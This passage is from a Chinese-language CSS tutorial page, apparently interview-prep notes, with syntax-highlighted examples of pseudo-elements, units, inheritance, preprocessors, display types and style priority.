punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>one<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>伪元素 ::after<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>two<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>伪元素 ::after<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>three<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>伪元素 ::after<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845936.png\" alt=\"image-20220318094953912\"></p>\n<h4 id=\"2-before\"><a href=\"#2-before\" class=\"headerlink\" title=\"2. ::before\"></a>2. ::before</h4><p>伪元素 ::before 能够在指定元素的前面插入一些内容。与 ::after 相似，::before 中也需要使用 content 属性来定义要追加的内容，而且在 ::before 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空<code>&quot;&quot;</code>）。</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n        <span class=\"token selector\">p.one::before</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">content</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> blue<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token selector\">p.two::before</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">content</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"要插入的内容\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 6px<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token selector\">p.three::before</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">content</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">'./smiley.gif'</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span>\n            <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 8px<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>one<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>伪元素 ::before<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>two<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>伪元素 ::before<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>three<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>伪元素 ::before<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845792.png\" alt=\"image-20220318095327303\"></p>\n<h4 id=\"3-first-letter\"><a href=\"#3-first-letter\" class=\"headerlink\" title=\"3. ::first-letter\"></a>3. ::first-letter</h4><p>伪元素 ::first-letter 用来设置指定元素中内容第一个字符的样式，通常用来配合 font-size 和 float 属性制作首字下沉效果。需要注意的是，伪元素 ::first-letter 仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。</p>\n<p>下面通过示例来演示伪元素 ::first-letter 的使用：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n        <span class=\"token selector\">p::first-letter</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 2em<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> blue<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>伪元素 ::first-letter<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845237.png\" alt=\"image-20220318095418822\"></p>\n<h4 id=\"4-first-line\"><a href=\"#4-first-line\" class=\"headerlink\" title=\"4. ::first-line\"></a>4. ::first-line</h4><p>伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。</p>\n<p>下面通过示例来演示伪元素 ::first-line 的使用：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n        <span class=\"token selector\">p::first-line</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 1.5em<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> blue<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">font-weight</span><span class=\"token punctuation\">:</span> bold<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845290.png\" alt=\"image-20220318095501603\"></p>\n<h4 id=\"5-selection\"><a href=\"#5-selection\" class=\"headerlink\" title=\"5. ::selection\"></a>5. ::selection</h4><p>伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。</p>\n<p>下面通过示例来演示伪元素 ::selection 的使用：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\"><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\">\n        <span class=\"token selector\">p::selection</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span>\n            <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span> #CCC<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    </span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行结果如下图所示：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846862.gif\" alt=\"伪元素 ::selection 的使用\"><br>图：伪元素 ::selection 的使用</p>\n<h4 id=\"6-placeholder\"><a href=\"#6-placeholder\" class=\"headerlink\" title=\"6. ::placeholder\"></a>6. ::placeholder</h4><p>伪元素 ::placeholder 用来设置表单元素（input、textarea 元素）的占位文本（通过 HTML 的 placeholder 属性设置的文本），示例代码如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;style&gt;\n        input.text::placeholder&#123;\n            color: red;\n            background-color: #CCC;\n        &#125;\n    &lt;&#x2F;style&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n    &lt;input placeholder&#x3D;&quot;请输入一段文本&quot;&gt;未使用伪元素 ::placeholder&lt;br&gt;\n    &lt;input placeholder&#x3D;&quot;请输入一段文本&quot; class&#x3D;&quot;text&quot;&gt;使用伪元素 ::placeholder 的效果\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行结果如下图所示：</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846269.gif\" alt=\"伪元素 ::placeholder 的使用\"></p>\n<h3 id=\"4、圆角\"><a href=\"#4、圆角\" class=\"headerlink\" title=\"4、圆角\"></a>4、圆角</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">border-radius<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"5、浮动和清除浮动\"><a href=\"#5、浮动和清除浮动\" class=\"headerlink\" title=\"5、浮动和清除浮动\"></a>5、<strong>浮动和清除浮动</strong></h3><h4 id=\"清除浮动\"><a href=\"#清除浮动\" class=\"headerlink\" title=\"清除浮动:\"></a>清除浮动:</h4><ul>\n<li>父元素内联块元素 inline-block</li>\n</ul>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">.father&#123;\n display:inline-block\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"6、固定定位\"><a href=\"#6、固定定位\" class=\"headerlink\" title=\"6、固定定位\"></a>6、固定定位</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">position:fixed<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n\n\n<h3 id=\"7、CSS单位（一）\"><a href=\"#7、CSS单位（一）\" class=\"headerlink\" title=\"7、CSS单位（一）\"></a>7、<strong>CSS单位（一）</strong></h3><h4 id=\"em和rem\"><a href=\"#em和rem\" class=\"headerlink\" title=\"em和rem\"></a>em和rem</h4><p>简单的说</p>\n<ul>\n<li><strong>em:</strong> 就是字体大小，根据元素自身的字体大小来定，如果自身没有定义字体大小，则继承父元素的字体大小，即1em &#x3D; 1 font-size;</li>\n<li><strong>rem:</strong> 和em差不多，可以看成是root-em，是根据根元素的字体大小来定义的，即html设置的字体大小来定义，默认html的字体大小是16px；</li>\n</ul>\n<h3 id=\"8、继承相关\"><a href=\"#8、继承相关\" class=\"headerlink\" title=\"8、继承相关\"></a>8、继承相关</h3><p>css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。</p>\n<p><strong>无继承性的属性</strong></p>\n<p>1、display：规定元素应该生成的框的类型</p>\n<p>2、文本属性：</p>\n<p>vertical-align：垂直文本对齐</p>\n<p>text-decoration：规定添加到文本的装饰</p>\n<p>text-shadow：文本阴影效果</p>\n<p>white-space：空白符的处理</p>\n<p>unicode-bidi：设置文本的方向</p>\n<p>3、盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left</p>\n<p>4、背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment</p>\n<p>5、定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index</p>\n<p>6、生成内容属性：content、counter-reset、counter-increment</p>\n<p>7、轮廓样式属性：outline-style、outline-width、outline-color、outline</p>\n<p>8、页面样式属性：size、page-break-before、page-break-after</p>\n<p>9、声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during</p>\n<p><strong>有继承性的属性</strong></p>\n<p>1、字体系列属性</p>\n<p>font：组合字体</p>\n<p>font-family：规定元素的字体系列</p>\n<p>font-weight：设置字体的粗细</p>\n<p>font-size：设置字体的尺寸</p>\n<p>font-style：定义字体的风格</p>\n<p>font-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。</p>\n<p>font-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。</p>\n<p>font-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。</p>\n<p>2、文本系列属性</p>\n<p>text-indent：文本缩进</p>\n<p>text-align：文本水平对齐</p>\n<p>line-height：行高</p>\n<p>word-spacing：增加或减少单词间的空白（即字间隔）</p>\n<p>letter-spacing：增加或减少字符间的空白（字符间距）</p>\n<p>text-transform：控制文本大小写</p>\n<p>direction：规定文本的书写方向</p>\n<p>color：文本颜色 a元素除外</p>\n<p>3、元素可见性：visibility</p>\n<p>4、表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout</p>\n<p>5、列表布局属性：list-style-type、list-style-image、list-style-position、list-style</p>\n<p>6、生成内容属性：quotes</p>\n<p>7、光标属性：cursor</p>\n<p>8、页面样式属性：page、page-break-inside、windows、orphans</p>\n<p>9、声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation</p>\n<p><strong>所有元素可以继承的属性</strong></p>\n<p>1、元素可见性：visibility</p>\n<p>2、光标属性：cursor</p>\n<p><strong>内联元素可以继承的属性</strong></p>\n<p>1、字体系列属性</p>\n<p>2、除text-indent、text-align之外的文本系列属性</p>\n<p><strong>块级元素可以继承的属性</strong></p>\n<p>1、text-indent、text-align</p>\n<h3 id=\"9、css预处理工具\"><a href=\"#9、css预处理工具\" class=\"headerlink\" title=\"9、css预处理工具\"></a>9、css预处理工具</h3><p><strong>参考答案</strong>：</p>\n<p><strong>CSS 预处理器</strong>是一个能让你通过预处理器自己独有的语法来生成CSS的程序。</p>\n<p>css预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；它们各自的背景如下:</p>\n<p>Sass：</p>\n<p>2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。</p>\n<p>Less：</p>\n<p>2009年出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。</p>\n<p>Stylus：</p>\n<p>2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。</p>\n<p><strong>比较</strong></p>\n<p>在使用 CSS 预处理器之前最重要的是理解语法，幸运的是基本上大多数预处理器的语法跟 CSS 都差不多。</p>\n<p>首先 Sass 和 Less 都使用的是标准的 CSS 语法，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">h1</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #0982C1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式：</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\">h1\n<span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #0982c1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>而 Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名，下面是 Stylus 支持的语法</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token comment\">/* style.styl */</span>\n<span class=\"token selector\">h1</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #0982C1<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">/* omit brackets */</span>\nh1\n<span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #0982C1<span class=\"token punctuation\">;</span>\n<span class=\"token comment\">/* omit colons and semi-colons */</span>\nh1\ncolor #0982C1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错：</p>\n<pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">h1</span> <span class=\"token punctuation\">&#123;</span>\n  color #0982c1\n<span class=\"token punctuation\">&#125;</span>\nh2\n<span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 1.2em<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"10、行内元素和块级元素什么区别，然后怎么相互转换\"><a href=\"#10、行内元素和块级元素什么区别，然后怎么相互转换\" class=\"headerlink\" title=\"10、行内元素和块级元素什么区别，然后怎么相互转换\"></a>10、行内元素和块级元素什么区别，然后怎么相互转换</h3><p><strong>参考答案:</strong></p>\n<p><strong>块级元素</strong></p>\n<p>1.总是从新的一行开始，即各个块级元素独占一行，默认垂直向下排列；</p>\n<p>2.高度、宽度、margin及padding都是可控的，设置有效，有边距效果；</p>\n<p>3.宽度没有设置时，默认为100%；</p>\n<p>4.块级元素中可以包含块级元素和行内元素。</p>\n<p><strong>行内元素</strong></p>\n<p>1.和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列；</p>\n<p>2.高度、宽度是不可控的，设置无效，由内容决定。</p>\n<p>3.根据标签语义化的理念，行内元素最好只包含行内元素，不包含块级元素。</p>\n<p><strong>转换</strong></p>\n<p>当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。</p>\n<p>使用display属性能够将三者任意转换：</p>\n<p>(1)display:inline;转换为行内元素；</p>\n<p>(2)display:block;转换为块状元素；</p>\n<p>(3)display:inline-block;转换为行内块状元素。</p>\n<h3 id=\"11、样式优先级\"><a href=\"#11、样式优先级\" class=\"headerlink\" title=\"11、样式优先级\"></a>11、样式优先级</h3><p><strong>参考答案</strong>：</p>\n<p>样式类型</p>\n<p>样式类型分为三类</p>\n<ol>\n<li>行间</li>\n</ol>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>font-size:12px;color:#000;<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>我的行间CSS样式。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<ol>\n<li>内联</li>\n</ol>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/css<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n   h1&#123;font-size:12px;\n      color:#000;\n      &#125;\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>外部</li>\n</ol>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>link</span> <span class=\"token attr-name\">rel</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>stylesheet<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token 